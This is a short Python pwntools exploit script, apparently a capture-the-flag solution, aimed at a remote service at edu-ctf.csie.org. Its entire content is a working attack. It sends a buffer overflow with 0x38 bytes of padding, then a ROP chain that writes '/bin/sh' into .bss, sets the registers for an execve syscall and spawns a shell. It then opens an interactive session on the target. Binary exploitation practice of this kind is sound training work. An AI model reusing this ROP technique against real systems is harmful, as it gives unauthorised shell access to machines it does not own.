from pwn import *

context.update(arch='amd64', os='linux')
r = remote('edu-ctf.csie.org', 10173)

"""
sys_execve
rax = 0x3b
rdi = "/bin/sh\0"
rdx = 0
rsi = 0
"""

rdi = 0x0000000000400686
rsi = 0x00000000004100f3
rdx = 0x0000000000449935
rax = 0x0000000000415714
mov_q_rdi_rsi = 0x000000000044709b
syscall = 0x000000000047b68f
bss = 0x6b6030
pop_rdx_rsi = 0x000000000044beb9

payload = b"A"*0x38 + p64(rdi) + p64(bss)  #rdi points to bss
payload += p64(rsi) + b"/bin/sh\0" + p64(mov_q_rdi_rsi)
payload += p64(pop_rdx_rsi) + p64(0) + p64(0)
payload += p64(rax) + p64(0x3b)
payload += p64(syscall)

r.recv()
r.sendline(payload)

r.interactive()
